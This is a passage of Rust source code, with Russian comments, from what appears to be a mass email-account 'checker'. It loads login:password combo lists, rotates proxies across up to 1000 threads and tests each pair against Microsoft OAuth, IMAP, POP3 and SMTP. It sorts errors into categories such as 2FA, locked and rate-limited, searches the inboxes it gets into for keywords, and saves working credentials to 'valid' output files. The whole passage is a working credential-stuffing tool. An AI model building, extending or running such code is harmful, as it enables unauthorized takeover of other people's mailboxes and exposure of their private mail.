        || body.contains("account_locked")
    {
        return Err((Cat::Locked, "учетная запись заблокирована (MS OAuth)".into()));
    }
    if body.contains("AADSTS70002")
        || body.contains("AADSTS70008")
        || body.starts_with("HTTP/1.1 429")
        || body.contains("Rate limit")
    {
        return Err((Cat::RateLimited, "превышен лимит запросов MS".into()));
    }

    let first_line = body.lines().next().unwrap_or("HTTP/1.1 Error");
    Err((Cat::Protocol, format!("ответ MS OAuth: {first_line}")))
}

// ---------- КЛАССИФИКАЦИЯ ОШИБОК ----------

pub fn classify(err: &str) -> Cat {
    let e = err.to_lowercase();
    if e.contains("application-specific")
        || e.contains("app password")
        || e.contains("imap access is disabled")
        || e.contains("imap is disabled")
        || e.contains("webissue")
        || e.contains("2fa")
        || e.contains("two-step")
        || e.contains("two factor")
        || e.contains("less secure")
        || e.contains("authenticate via")
    {
        Cat::TwoFA
    } else if e.contains("locked")
        || e.contains("disabled")
        || e.contains("suspended")
        || e.contains("blocked")
        || e.contains("deactivat")
    {
        Cat::Locked
    } else if e.contains("too many")
        || e.contains("rate limit")
        || e.contains("try again later")
        || e.contains("try later")
        || e.contains("temporar")
    {
        Cat::RateLimited
    } else if e.contains("captcha") || e.contains("unusual") {
        Cat::Captcha
    } else if e.contains("authenticationfailed")
        || e.contains("invalid credential")
        || e.contains("incorrect")
        || e.contains("bad username or password")
        || e.contains("login failed")
        || e.contains("-err")
        || e.contains("535")
        || e.contains("auth")
    {
        Cat::Invalid
    } else if e.contains("tls")
        || e.contains("ssl")
        || e.contains("certificate")
        || e.contains("handshake")
    {
        Cat::Tls
    } else if e.contains("timed out") || e.contains("timeout") {
        Cat::Timeout
    } else if e.contains("resolve")
        || e.contains("no such host")
        || e.contains("not known")
        || e.contains("dns")
        || e.contains("lookup")
    {
        Cat::ServerNf
    } else if e.contains("proxy") || e.contains("socks") {
        Cat::Proxy
    } else if e.contains("refused")
        || e.contains("reset")
        || e.contains("unreachable")
        || e.contains("connection")
    {
        Cat::Connection
    } else {
        Cat::Protocol
    }
}

// ---------- ПОПЫТКИ ЛОГИНА (IMAP, POP3, SMTP) ----------

fn read_line(s: &mut impl Read) -> std::io::Result<String> {
    let mut res = Vec::new();
    let mut b = [0u8; 1];
    loop {
        s.read_exact(&mut b)?;
        if b[0] == b'\n' {
            break;
        }
        res.push(b[0]);
    }
    if res.ends_with(b"\r") {
        res.pop();
    }
    Ok(String::from_utf8_lossy(&res).into_owned())
}

fn read_smtp(s: &mut impl Read) -> std::io::Result<String> {
    loop {
        let line = read_line(s)?;
        if line.len() >= 4 && line.as_bytes()[3] == b' ' {
            return Ok(line);
        }
        if line.len() < 4 {
            return Ok(line);
        }
    }
}

pub fn try_imap_with_search(
    host: &str,
    port: u16,
    a: &Acct,
    proxy: Option<&Proxy>,
    to: Duration,
    rules: &[SearchRule],
    search_mode: &str,
) -> Result<(u32, bool), (Cat, String)> {
    let stream = dial(host, port, proxy, to)?;
    let tls = tls_wrap(host, stream)?;
    let mut client = imap::Client::new(tls);
    client
        .read_greeting()
        .map_err(|e| (classify(&e.to_string()), e.to_string()))?;
    let mut sess = client
        .login(&a.login, &a.pass)
        .map_err(|(e, _)| (classify(&e.to_string()), e.to_string()))?;
    let _ = sess.select("INBOX");
    let unseen = sess.search("UNSEEN").map(|ids| ids.len() as u32).unwrap_or(0);
    let mut found = false;
    if !rules.is_empty() {
        if let Ok(matched) = execute_search_on_imap_session(&mut sess, rules, search_mode) {
            found = matched;
        }
    }
    let _ = sess.logout();
    Ok((unseen, found))
}

pub fn try_imap(
    host: &str,
    port: u16,
    a: &Acct,
    proxy: Option<&Proxy>,
    to: Duration,
) -> Result<u32, (Cat, String)> {
    try_imap_with_search(host, port, a, proxy, to, &[], "or").map(|(u, _)| u)
}

pub fn try_pop3(
    host: &str,
    port: u16,
    a: &Acct,
    proxy: Option<&Proxy>,
    to: Duration,
) -> Result<u32, (Cat, String)> {
    let stream = dial(host, port, proxy, to)?;
    let mut tls = tls_wrap(host, stream)?;

    let greeting = read_line(&mut tls).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if !greeting.starts_with("+OK") {
        return Err((Cat::Protocol, greeting));
    }

    tls.write_all(format!("USER {}\r\n", a.login).as_bytes())
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let user_resp = read_line(&mut tls).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if user_resp.starts_with("-ERR") {
        return Err((classify(&user_resp), user_resp));
    }

    tls.write_all(format!("PASS {}\r\n", a.pass).as_bytes())
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let pass_resp = read_line(&mut tls).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if pass_resp.starts_with("-ERR") {
        return Err((classify(&pass_resp), pass_resp));
    }

    tls.write_all(b"STAT\r\n")
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let stat_resp = read_line(&mut tls).unwrap_or_default();
    let count = if stat_resp.starts_with("+OK") {
        stat_resp
            .split_whitespace()
            .nth(1)
            .and_then(|c| c.parse::<u32>().ok())
            .unwrap_or(0)
    } else {
        0
    };

    let _ = tls.write_all(b"QUIT\r\n");
    Ok(count)
}

fn try_smtp_stream(mut stream: impl ReadWrite, a: &Acct) -> Result<u32, (Cat, String)> {
    let greeting = read_smtp(&mut stream).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if !greeting.starts_with("220") {
        return Err((classify(&greeting), greeting));
    }

    stream
        .write_all(b"EHLO mailcheck\r\n")
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let ehlo_resp = read_smtp(&mut stream).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if !ehlo_resp.starts_with("250") {
        return Err((classify(&ehlo_resp), ehlo_resp));
    }

    stream
        .write_all(b"AUTH LOGIN\r\n")
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let auth_resp = read_smtp(&mut stream).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if !auth_resp.starts_with("334") {
        return Err((classify(&auth_resp), auth_resp));
    }

    let user_b64 = base64::engine::general_purpose::STANDARD.encode(&a.login);
    stream
        .write_all(format!("{user_b64}\r\n").as_bytes())
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let u_resp = read_smtp(&mut stream).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if !u_resp.starts_with("334") {
        return Err((classify(&u_resp), u_resp));
    }

    let pass_b64 = base64::engine::general_purpose::STANDARD.encode(&a.pass);
    stream
        .write_all(format!("{pass_b64}\r\n").as_bytes())
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let p_resp = read_smtp(&mut stream).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if p_resp.starts_with("235") {
        let _ = stream.write_all(b"QUIT\r\n");
        Ok(0)
    } else {
        Err((classify(&p_resp), p_resp))
    }
}
pub fn try_smtp(
    host: &str,
    port: u16,
    port_starttls: u16,
    a: &Acct,
    proxy: Option<&Proxy>,
    to: Duration,
) -> Result<u32, (Cat, String)> {
    if let Ok(stream) = dial(host, port, proxy, to) {
        if let Ok(tls) = tls_wrap(host, stream) {
            return try_smtp_stream(tls, a);
        }
    }
    let mut plain = dial(host, port_starttls, proxy, to)?;
    let greeting = read_smtp(&mut plain).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if !greeting.starts_with("220") {
        return Err((classify(&greeting), greeting));
    }
    plain
        .write_all(b"EHLO mailcheck\r\n")
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let _ = read_smtp(&mut plain);
    plain
        .write_all(b"STARTTLS\r\n")
        .map_err(|e| (Cat::Connection, e.to_string()))?;
    let starttls_resp = read_smtp(&mut plain).map_err(|e| (Cat::Protocol, e.to_string()))?;
    if !starttls_resp.starts_with("220") {
        return Err((classify(&starttls_resp), starttls_resp));
    }
    let tls = tls_wrap(host, plain)?;
    try_smtp_stream(tls, a)
}

// ---------- ПОИСК И ПРОСМОТР ПИСЕМ (IMAP) ----------

pub fn dec(b: &[u8]) -> String {
    rfc2047_decoder::decode(b).unwrap_or_else(|_| String::from_utf8_lossy(b).into_owned())
}

pub fn opt(b: Option<&[u8]>) -> String {
    b.map(|x| String::from_utf8_lossy(x).into_owned())
        .unwrap_or_default()
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
pub struct SearchRule {
    pub field: String,
    pub term: String,
}

pub fn execute_search_on_imap_session(
    sess: &mut imap::Session<native_tls::TlsStream<Stream>>,
    rules: &[SearchRule],
    search_mode: &str,
) -> Result<bool, (Cat, String)> {
    if rules.is_empty() {
        return Ok(false);
    }
    let _ = sess.select("INBOX");
    let is_and = search_mode.eq_ignore_ascii_case("and");
    if is_and {
        for r in rules {
            let term = r.term.trim();
            if term.is_empty() {
                continue;
            }
            let query = build_query(&r.field, term);
            match sess.search(&query) {
                Ok(ids) => {
                    if ids.is_empty() {
                        return Ok(false);
                    }
                }
                Err(e) => return Err((classify(&e.to_string()), e.to_string())),
            }
        }
        Ok(true)
    } else {
        for r in rules {
            let term = r.term.trim();
            if term.is_empty() {
                continue;
            }
            let query = build_query(&r.field, term);
            match sess.search(&query) {
                Ok(ids) => {
                    if !ids.is_empty() {
                        return Ok(true);
                    }
                }
                Err(e) => return Err((classify(&e.to_string()), e.to_string())),
            }
        }
        Ok(false)
    }
}
pub fn build_query(key: &str, term: &str) -> String {
    let charset = if term.is_ascii() { "" } else { "CHARSET UTF-8 " };
    format!("{}{} \"{}\"", charset, key, term.replace('"', "\\\""))
}

pub fn search_match(a: &Acct, cfg: &RunCfg) -> Result<bool, (Cat, String)> {
    if cfg.rules.is_empty() && cfg.term.trim().is_empty() {
        return Ok(false);
    }
    let domain = domain_of(&a.login);
    let (hosts, _) = discover_hosts(&domain, cfg.use_auto, cfg.use_shared_hosts, cfg.auto_timeout, &cfg.auto_cache);
    let mut last_err = (Cat::Connection, "нет IMAP-хостов".into());

    let rules = if !cfg.rules.is_empty() {
        cfg.rules.clone()
    } else {
        vec![SearchRule {
            field: if cfg.field.is_empty() {
                "SUBJECT".into()
            } else {
                cfg.field.clone()
            },
            term: cfg.term.clone(),
        }]
    };

    for host in hosts.imap {
        let proxy = pick_proxy(cfg);
        let stream = match dial(&host, cfg.port_imap, proxy.as_ref(), cfg.timeout) {
            Ok(s) => s,
            Err(e) => {
                last_err = e;
                continue;
            }
        };
        let tls = match tls_wrap(&host, stream) {
            Ok(t) => t,
            Err(e) => {
                last_err = e;
                continue;
            }
        };
        let mut client = imap::Client::new(tls);
        if let Err(e) = client.read_greeting() {
            last_err = (classify(&e.to_string()), e.to_string());
            continue;
        }
        let mut sess = match client.login(&a.login, &a.pass) {
            Ok(s) => s,
            Err((e, _)) => {
                last_err = (classify(&e.to_string()), e.to_string());
                break;
            }
        };
        let res = execute_search_on_imap_session(&mut sess, &rules, &cfg.search_mode);
        let _ = sess.logout();
        return res;
    }
    Err(last_err)
}

#[derive(Serialize, Clone, Debug)]
pub struct Mail {
    pub date: String,
    pub from: String,
    pub subject: String,
    pub seen: bool,
}

pub fn try_fetch(a: &Acct, cfg: &RunCfg, field: &str, term: &str) -> Result<Vec<Mail>, String> {
    let domain = domain_of(&a.login);
    let (hosts, _) = discover_hosts(&domain, cfg.use_auto, cfg.use_shared_hosts, cfg.auto_timeout, &cfg.auto_cache);
    let mut last_err = "нет IMAP-хостов для данного домена".to_string();

    for host in hosts.imap {
        let proxy = pick_proxy(cfg);
        let stream = match dial(&host, cfg.port_imap, proxy.as_ref(), cfg.timeout) {
            Ok(s) => s,
            Err(e) => {
                last_err = e.1;
                continue;
            }
        };
        let tls = match tls_wrap(&host, stream) {
            Ok(t) => t,
            Err(e) => {
                last_err = e.1;
                continue;
            }
        };
        let mut client = imap::Client::new(tls);
        if let Err(e) = client.read_greeting() {
            last_err = e.to_string();
            continue;
        }
        let mut sess = match client.login(&a.login, &a.pass) {
            Ok(s) => s,
            Err((e, _)) => return Err(e.to_string()),
        };
        if let Err(e) = sess.select("INBOX") {
            return Err(e.to_string());
        }
        let query = if term.is_empty() {
            "ALL".into()
        } else {
            build_query(field, term)
        };
        let mut ids: Vec<u32> = sess
            .search(&query)
            .map_err(|e| e.to_string())?
            .into_iter()
            .collect();
        ids.sort_unstable_by(|a, b| b.cmp(a));
        ids.truncate(50);

        let mut mails = Vec::new();
        if !ids.is_empty() {
            let set = ids
                .iter()
                .map(|n| n.to_string())
                .collect::<Vec<_>>()
                .join(",");
            let fetches = sess
                .fetch(&set, "(ENVELOPE FLAGS)")
                .map_err(|e| e.to_string())?;
            let mut items: Vec<_> = fetches.iter().collect();
            items.sort_by(|a, b| b.message.cmp(&a.message));
            for f in items {
                let env = match f.envelope() {
                    Some(e) => e,
                    None => continue,
                };
                let from = env
                    .from
                    .as_ref()
                    .and_then(|v| v.first())
                    .map(|ad| {
                        let email = format!("{}@{}", opt(ad.mailbox), opt(ad.host));
                        match ad.name {
                            Some(n) => format!("{} <{}>", dec(n), email),
                            None => email,
                        }
                    })
                    .unwrap_or_else(|| "(нет отправителя)".into());
                mails.push(Mail {
                    date: opt(env.date),
                    from,
                    subject: env.subject.map(dec).unwrap_or_default(),
                    seen: f.flags().iter().any(|fl| *fl == imap::types::Flag::Seen),
                });
            }
        }
        let _ = sess.logout();
        return Ok(mails);
    }
    Err(last_err)
}

// ---------- ОРКЕСТРАЦИЯ АККАУНТОВ ----------

#[derive(Clone, Debug)]
pub struct Acct {
    pub login: String,
    pub pass: String,
}

pub fn parse_accounts(raw: &str) -> Vec<Acct> {
    raw.lines()
        .filter_map(|l| {
            let l = l.trim();
            if l.is_empty() || l.starts_with('#') {
                return None;
            }
            let (u, p) = l.split_once(':')?;
            let (u, p) = (u.trim(), p.trim());
            if u.is_empty() || p.is_empty() {
                None
            } else {
                Some(Acct {
                    login: u.into(),
                    pass: p.into(),
                })
            }
        })
        .collect()
}

pub fn load_accounts_from_path_or_str(path: &str, raw: &str) -> Vec<Acct> {
    if !path.trim().is_empty() {
        if let Ok(file) = std::fs::File::open(path) {
            use std::io::BufRead;
            let reader = std::io::BufReader::with_capacity(1024 * 1024, file);
            let mut accts = Vec::with_capacity(65536);
            for line in reader.lines().flatten() {
                let l = line.trim();
                if l.is_empty() || l.starts_with('#') {
                    continue;
                }
                if let Some((u, p)) = l.split_once(':') {
                    let (u, p) = (u.trim(), p.trim());
                    if !u.is_empty() && !p.is_empty() {
                        accts.push(Acct {
                            login: u.to_string(),
                            pass: p.to_string(),
                        });
                    }
                }
            }
            if !accts.is_empty() {
                return accts;
            }
        }
    }
    parse_accounts(raw)
}

pub fn load_proxies_from_path_or_str(path: &str, raw: &str, default: ProxyKind) -> Vec<Proxy> {
    if !path.trim().is_empty() {
        if let Ok(file) = std::fs::File::open(path) {
            use std::io::BufRead;
            let reader = std::io::BufReader::with_capacity(512 * 1024, file);
            let mut list = Vec::new();
            for line in reader.lines().flatten() {
                if let Some(p) = parse_proxy(&line, default) {
                    list.push(p);
                }
            }
            if !list.is_empty() {
                return list;
            }
        }
    }
    parse_proxies(raw, default)
}

#[derive(Clone, Debug)]
pub struct RunCfg {
    pub threads: usize,
    pub protocols: Vec<String>,
    pub use_proxies: bool,
    pub proxies: Arc<Vec<Proxy>>,
    pub timeout: Duration,
    pub retries: u32,
    pub field: String,
    pub term: String,
    pub rules: Vec<SearchRule>,
    pub search_mode: String,
    pub use_auto: bool,
    pub auto_learn: bool,
    pub auto_timeout: Duration,
    pub port_imap: u16,
    pub port_pop3: u16,
    pub port_smtp: u16,
    pub port_starttls: u16,
    pub auto_cache: Arc<Mutex<HashMap<String, Hosts>>>,
    pub use_shared_hosts: bool,
}

#[derive(Serialize, Clone, Debug)]
pub struct Row {
    pub id: u64,
    pub login: String,
    pub pass: String,
    pub protocol: String,
    pub host: String,
    pub country: String,
    pub count: u32,
    pub category: String,
    pub found: bool,
    pub corporate: bool,
    pub auto: bool,
    pub proxy: String,
    pub error: String,
}

pub fn pick_proxy(cfg: &RunCfg) -> Option<Proxy> {
    if !cfg.use_proxies || cfg.proxies.is_empty() {
        None
    } else {
        let ix = PROXY_IX.fetch_add(1, Ordering::Relaxed);
        Some(cfg.proxies[ix % cfg.proxies.len()].clone())
    }
}

pub fn check_account(id: u64, a: &Acct, cfg: &RunCfg) -> Row {
    let domain = domain_of(&a.login);
    if domain.is_empty() {
        return Row {
            id,
            login: a.login.clone(),
            pass: a.pass.clone(),
            protocol: "—".into(),
            host: "".into(),
            country: "UN".into(),
            count: 0,
            category: "invalid".into(),
            found: false,
            corporate: false,
            auto: false,
            proxy: "".into(),
            error: "нет домена в адресе".into(),
        };
    }

    let ctry = country(&domain);
    let (hosts, is_auto) = discover_hosts(&domain, cfg.use_auto, cfg.use_shared_hosts, cfg.auto_timeout, &cfg.auto_cache);
    let mut best_fail: Option<(Cat, String, String, String, String)> = None;

    // 1. Проверка через прямой Microsoft OAuth / ROPS при обнаружении связи с Microsoft
    if is_microsoft_linked(&domain, &hosts) {
        let proxy_opt = pick_proxy(cfg);
        let proxy_str = proxy_opt
            .as_ref()
            .map(|p| format!("{}:{}", p.host, p.port))
            .unwrap_or_default();

        match try_microsoft_oauth(a, proxy_opt.as_ref(), cfg.timeout) {
            Ok(count) => {
                let corporate = !is_freemail(&domain);
                let mut found = false;
                if !cfg.rules.is_empty() || !cfg.term.trim().is_empty() {
                    if let Ok(m) = search_match(a, cfg) {
                        found = m;
                    }
                }
                return Row {
                    id,
                    login: a.login.clone(),
                    pass: a.pass.clone(),
                    protocol: "OUTLOOK".into(),
                    host: "login.live.com".into(),
                    country: ctry,
                    count,
                    category: "success".into(),
                    found,
                    corporate,
                    auto: is_auto,
                    proxy: proxy_str,
                    error: String::new(),
                };
            }
            Err((cat, err)) => {
                if matches!(cat, Cat::Invalid | Cat::TwoFA | Cat::Locked) {
                    return Row {
                        id,
                        login: a.login.clone(),
                        pass: a.pass.clone(),
                        protocol: "OUTLOOK".into(),
                        host: "login.live.com".into(),
                        country: ctry,
                        count: 0,
                        category: cat.key().into(),
                        found: false,
                        corporate: !is_freemail(&domain),
                        auto: is_auto,
                        proxy: proxy_str,
                        error: err,
                    };
                }
                best_fail = Some((cat, "OUTLOOK".into(), "login.live.com".into(), proxy_str, err));
            }
        }
    }

    let protocols = if cfg.protocols.is_empty() {
        vec!["IMAP".to_string(), "POP3".to_string(), "SMTP".to_string()]
    } else {
        cfg.protocols.clone()
    };

    for proto in &protocols {
        if CANCEL.load(Ordering::Relaxed) {
            break;
        }
        let proto_hosts = match proto.to_uppercase().as_str() {
            "IMAP" => &hosts.imap,
            "POP3" => &hosts.pop3,
            "SMTP" => &hosts.smtp,
            _ => continue,
        };

        for host in proto_hosts {
            if CANCEL.load(Ordering::Relaxed) {
                break;
            }
            let mut stop_proto_hosts = false;
            for _ in 0..=(cfg.retries) {
                if CANCEL.load(Ordering::Relaxed) {
                    break;
                }
                let proxy_opt = pick_proxy(cfg);
                let proxy_str = proxy_opt
                    .as_ref()
                    .map(|p| format!("{}:{}", p.host, p.port))
                    .unwrap_or_default();

                let res = match proto.to_uppercase().as_str() {
                    "IMAP" => try_imap_with_search(
                        host,
                        cfg.port_imap,
                        a,
                        proxy_opt.as_ref(),
                        cfg.timeout,
                        &cfg.rules,
                        &cfg.search_mode,
                    ),
                    "POP3" => try_pop3(host, cfg.port_pop3, a, proxy_opt.as_ref(), cfg.timeout)
                        .map(|c| (c, false)),
                    "SMTP" => try_smtp(
                        host,
                        cfg.port_smtp,
                        cfg.port_starttls,
                        a,
                        proxy_opt.as_ref(),
                        cfg.timeout,
                    )
                    .map(|c| (c, false)),
                    _ => continue,
                };

                match res {
                    Ok((count, mut found)) => {
                        let corporate = !is_freemail(&domain);
                        learn_and_submit(&domain, proto, host, &hosts, cfg);

                        if !found && (!cfg.rules.is_empty() || !cfg.term.trim().is_empty()) && proto.to_uppercase() != "IMAP" {
                            if let Ok(m) = search_match(a, cfg) {
                                found = m;
                            }
                        }

                        return Row {
                            id,
                            login: a.login.clone(),
                            pass: a.pass.clone(),
                            protocol: proto.to_uppercase(),
                            host: host.clone(),
                            country: ctry,
                            count,
                            category: "success".into(),
                            found,
                            corporate,
                            auto: is_auto,
                            proxy: proxy_str,
                            error: String::new(),
                        };
                    }
                    Err((cat, err)) => {
                        if matches!(cat, Cat::Invalid | Cat::TwoFA | Cat::Locked) {
                            stop_proto_hosts = true;
                            learn_and_submit(&domain, proto, host, &hosts, cfg);
                        } else if matches!(cat, Cat::ServerNf | Cat::Protocol | Cat::Tls) {
                            // Server not found or unsupported protocol on this host: do not retry this host
                            stop_proto_hosts = false;
                        }
                        let should_replace = match &best_fail {
                            None => true,
                            Some((best_cat, ..)) => cat.priority() < best_cat.priority(),
                        };
                        if should_replace {
                            best_fail = Some((cat, proto.clone(), host.clone(), proxy_str, err));
                        }
                        if stop_proto_hosts || matches!(cat, Cat::ServerNf | Cat::Protocol | Cat::Tls) {
                            break;
                        }
                    }
                }
            }
            if stop_proto_hosts {
                break;
            }
        }
    }
    if let Some((cat, proto, host, proxy_str, err)) = best_fail {
        Row {
            id,
            login: a.login.clone(),
            pass: a.pass.clone(),
            protocol: if matches!(cat, Cat::Invalid | Cat::TwoFA | Cat::Locked) {
                proto
            } else {
                "—".into()
            },
            host,
            country: ctry,
            count: 0,
            category: cat.key().into(),
            found: false,
            corporate: false,
            auto: is_auto,
            proxy: proxy_str,
            error: err,
        }
    } else {
        Row {
            id,
            login: a.login.clone(),
            pass: a.pass.clone(),
            protocol: "—".into(),
            host: "".into(),
            country: ctry,
            count: 0,
            category: "connection".into(),
            found: false,
            corporate: false,
            auto: is_auto,
            proxy: "".into(),
            error: "не удалось подключиться".into(),
        }
    }
}

fn learn_and_submit(
    domain: &str,
    proto: &str,
    host: &str,
    hosts: &Hosts,
    cfg: &RunCfg,
) {
    if !cfg.auto_learn {
        return;
    }
    let mut learned: Option<Hosts> = None;
    if let Ok(mut c) = cfg.auto_cache.lock() {
        let mut cached = hosts.clone();
        match proto.to_uppercase().as_str() {
            "IMAP" => {
                cached.imap.retain(|h| h != host);
                cached.imap.insert(0, host.to_string());
            }
            "POP3" => {
                cached.pop3.retain(|h| h != host);
                cached.pop3.insert(0, host.to_string());
            }
            "SMTP" => {
                cached.smtp.retain(|h| h != host);
                cached.smtp.insert(0, host.to_string());
            }
            _ => {}
        }
        c.insert(domain.to_string(), cached.clone());
        learned = Some(cached);
    }
    if cfg.use_shared_hosts {
        if let Some(h) = learned {
            hosts_api::submit(domain.to_string(), h);
        }
    }
}

// ---------- ВЫВОД В ФАЙЛЫ И ПУЛ ПОТОКОВ ----------

pub fn sanitize(name: &str) -> String {
    let mut clean = String::new();
    let mut last_was_under = false;
    for c in name.chars() {
        if c.is_ascii_alphanumeric() || c == '.' || c == '-' {
            clean.push(c);
            last_was_under = false;
        } else if !last_was_under {
            clean.push('_');
            last_was_under = true;
        }
    }
    let trimmed = clean.trim_matches('_');
    if trimmed.is_empty() {
        "search".to_string()
    } else {
        trimmed.to_string()
    }
}

pub struct Out {
    pub valid: Mutex<std::fs::File>,
    pub valid_outlook: Mutex<std::fs::File>,
    pub invalid: Mutex<std::fs::File>,
    pub request: Option<Mutex<std::fs::File>>,
}

pub fn open_out(dir: &Path, has_search: bool, term: &str) -> std::io::Result<Out> {
    std::fs::create_dir_all(dir)?;
    let valid = std::fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(dir.join("valid mails.txt"))?;
    let valid_outlook = std::fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(dir.join("valid outlook.txt"))?;
    let invalid = std::fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(dir.join("invalid mails.txt"))?;
    let request = if has_search {
        let name = if !term.trim().is_empty() {
            format!("{}mails.txt", sanitize(term))
        } else {
            "found_mails.txt".to_string()
        };
        let f = std::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(dir.join(name))?;
        Some(Mutex::new(f))
    } else {
        None
    };

    Ok(Out {
        valid: Mutex::new(valid),
        valid_outlook: Mutex::new(valid_outlook),
        invalid: Mutex::new(invalid),
        request,
    })
}

fn run_check(
    run_id: u64,
    accounts: Vec<Acct>,
    cfg: RunCfg,
    out: Option<Arc<Out>>,
    proxy_evt: EventLoopProxy<UserEvent>,
) {
    std::thread::spawn(move || {
        let total = accounts.len();
        let accounts = Arc::new(accounts);
        let idx = Arc::new(AtomicUsize::new(0));
        let done = Arc::new(AtomicUsize::new(0));
        let cfg = Arc::new(cfg);

        if RUN_ID.load(Ordering::SeqCst) != run_id {
            return;
        }

        let _ = proxy_evt.send_event(UserEvent::Eval(format!("window.progress(0, {total});")));

        let (tx, rx) = std::sync::mpsc::channel::<Row>();

        // Фоновый диспетчер UI-батчей: объединяет строки и прогресс для максимальной плавности
        let proxy_disp = proxy_evt.clone();
        let done_disp = done.clone();
        let disp_handle = std::thread::spawn(move || {
            let mut batch = Vec::with_capacity(64);
            let mut last_flush = Instant::now();
            loop {
                match rx.recv_timeout(Duration::from_millis(40)) {
                    Ok(row) => {
                        batch.push(row);
                        if batch.len() >= 64 || last_flush.elapsed() >= Duration::from_millis(50) {
                            let d = done_disp.load(Ordering::Relaxed);
                            if let Ok(json) = serde_json::to_string(&batch) {
                                let _ = proxy_disp.send_event(UserEvent::Eval(format!(
                                    "window.pushRowsBatch({json}, {d}, {total});"
                                )));
                            }
                            batch.clear();
                            last_flush = Instant::now();
                        }
                    }
                    Err(std::sync::mpsc::RecvTimeoutError::Timeout) => {
                        if !batch.is_empty() {
                            let d = done_disp.load(Ordering::Relaxed);
                            if let Ok(json) = serde_json::to_string(&batch) {
                                let _ = proxy_disp.send_event(UserEvent::Eval(format!(
                                    "window.pushRowsBatch({json}, {d}, {total});"
                                )));
                            }
                            batch.clear();
                            last_flush = Instant::now();
                        }
                    }
                    Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => {
                        if !batch.is_empty() {
                            let d = done_disp.load(Ordering::Relaxed);
                            if let Ok(json) = serde_json::to_string(&batch) {
                                let _ = proxy_disp.send_event(UserEvent::Eval(format!(
                                    "window.pushRowsBatch({json}, {d}, {total});"
                                )));
                            }
                        }
                        break;
                    }
                }
            }
        });

        let threads_count = cfg.threads.clamp(1, 1000).min(total.max(1));
        let mut handles = Vec::new();

        for _ in 0..threads_count {
            let (accounts, idx, done, cfg, out, tx) = (
                accounts.clone(),
                idx.clone(),
                done.clone(),
                cfg.clone(),
                out.clone(),
                tx.clone(),
            );

            handles.push(std::thread::spawn(move || loop {
                if CANCEL.load(Ordering::Relaxed) || RUN_ID.load(Ordering::Relaxed) != run_id {
                    break;
                }

                // Синхронизация паузы: нулевая нагрузка на CPU в режиме ожидания
                if PAUSED.load(Ordering::Relaxed) {
                    if let Ok(mut lock) = PAUSE_NOTIFY.0.lock() {
                        while *lock
                            && !CANCEL.load(Ordering::Relaxed)
                            && RUN_ID.load(Ordering::Relaxed) == run_id
                        {
                            lock = match PAUSE_NOTIFY.1.wait(lock) {
                                Ok(l) => l,
                                Err(p) => p.into_inner(),
                            };
                        }
                    }
                }

                if CANCEL.load(Ordering::Relaxed) || RUN_ID.load(Ordering::Relaxed) != run_id {
                    break;
                }

                let i = idx.fetch_add(1, Ordering::SeqCst);
                if i >= accounts.len() {
                    break;
                }

                let acct = &accounts[i];
                let id = ROW_ID.fetch_add(1, Ordering::Relaxed);
                let row = check_account(id, acct, &cfg);

                if CANCEL.load(Ordering::Relaxed) || RUN_ID.load(Ordering::Relaxed) != run_id {
                    break;
                }

                if let Some(o) = &out {
                    let line = format!("{}:{}\n", acct.login, acct.pass);
                    if row.category == "success" {
                        if let Ok(mut f) = o.valid.lock() {
                            let _ = f.write_all(line.as_bytes());
                        }
                        if row.protocol == "OUTLOOK" || is_microsoft_domain(&domain_of(&acct.login)) {
                            if let Ok(mut f) = o.valid_outlook.lock() {
                                let _ = f.write_all(line.as_bytes());
                            }
                        }
                        if row.found {
                            if let Some(req_file) = &o.request {
                                if let Ok(mut f) = req_file.lock() {
                                    let _ = f.write_all(line.as_bytes());
                                }
                            }
                        }
                    } else if let Ok(mut f) = o.invalid.lock() {
                        let _ = f.write_all(line.as_bytes());
                    }
                }

                done.fetch_add(1, Ordering::SeqCst);
                let _ = tx.send(row);
            }));
        }

        drop(tx);

        for h in handles {
            let _ = h.join();
        }

        let _ = disp_handle.join();

        if RUN_ID.load(Ordering::SeqCst) == run_id {
            BUSY.store(false, Ordering::SeqCst);
            let _ = proxy_evt.send_event(UserEvent::Eval("window.finish();".into()));
        }
    });
}

// ---------- IPC И ОКНО ----------

#[derive(Deserialize, Debug)]
#[serde(rename_all = "camelCase")]
struct In {
    cmd: String,
    #[serde(default)]
    creds: String,
    #[serde(default, alias = "creds_path")]
    creds_path: String,
    #[serde(default)]
    proxies: String,
    #[serde(default, alias = "proxies_path")]
    proxies_path: String,
    port_imap: u16,
    #[serde(default = "default_pop3_port", alias = "port_pop3")]
    port_pop3: u16,
    #[serde(default = "default_smtp_port", alias = "port_smtp")]
    port_smtp: u16,
    #[serde(default = "default_starttls_port", alias = "port_starttls")]
    port_starttls: u16,
    #[serde(default = "default_auto_timeout", alias = "auto_timeout")]
    auto_timeout: u64,
    #[serde(default = "default_true", alias = "auto_learn")]
    auto_learn: bool,
    #[serde(default, alias = "use_proxies")]
    use_proxies: bool,
    #[serde(default, alias = "proxy_type")]
    proxy_type: String,
    #[serde(default)]
    protocols: Vec<String>,
    #[serde(default)]
    threads: u32,
    #[serde(default)]
    timeout: u32,
    #[serde(default)]
    retries: u32,
    #[serde(default)]
    field: String,
    #[serde(default)]
    term: String,
    #[serde(default)]
    rules: Vec<SearchRule>,
    #[serde(default = "default_search_mode", alias = "search_mode")]
